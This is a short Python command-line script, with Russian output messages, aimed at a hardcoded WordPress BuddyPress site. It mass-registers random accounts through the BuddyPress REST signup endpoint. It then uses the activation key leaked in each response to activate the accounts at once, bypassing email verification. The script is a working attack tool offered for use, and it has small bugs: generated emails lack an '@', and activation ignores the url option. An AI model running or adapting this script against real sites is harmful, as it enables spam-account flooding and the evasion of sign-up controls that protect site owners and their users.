import requests
import sys, json, random, string
import typer
from typing import Optional


app = typer.Typer()
BASE_URL = "https://foxhustle.com"
EMAIL_DOMAINS = ["gmail.com", "mail.ru", "yandex.ru", "bing.com"]


def random_string(count):
       return ''.join(random.choice(string.ascii_letters) for x in range(count))


@app.command()
def register(username: Optional[str], email: Optional[str], password: Optional[str], url: str = BASE_URL, count: int = 1):    
    for _ in range(count):
        username = username if username else random_string(random.randint(6, 20))
        email = email if email else random_string(random.randint(6, 20)) + random.choice(EMAIL_DOMAINS)
        password = password if password else random_string(random.randint(6, 20))

        r = requests.post(url + "/wp-json/buddypress/v1/signup", headers={
            "Content-Type": "application/json; charset=UTF-8"
        }, data=json.dumps({
            "user_login": username, "user_email": email, "user_name": username, "password": password
        }))

        if r.status_code == 500:
            print(f"[-] Пользователь {username} уже зарегистрирован")
        elif r.status_code == 404:
            print("[-] Не получилось зарегистрироваться, так как регистрация отключена")
            sys.exit(1)
        else:
            data = json.loads(r.text)
            activation_key = data[0]["activation_key"]
            requests.put(
                BASE_URL + "/wp-json/buddypress/v1/signup/activate/" + activation_key
            )
            print(f"[+] Пользователь {username} успешно зарегистрирован")


if __name__ == "__main__":
    app()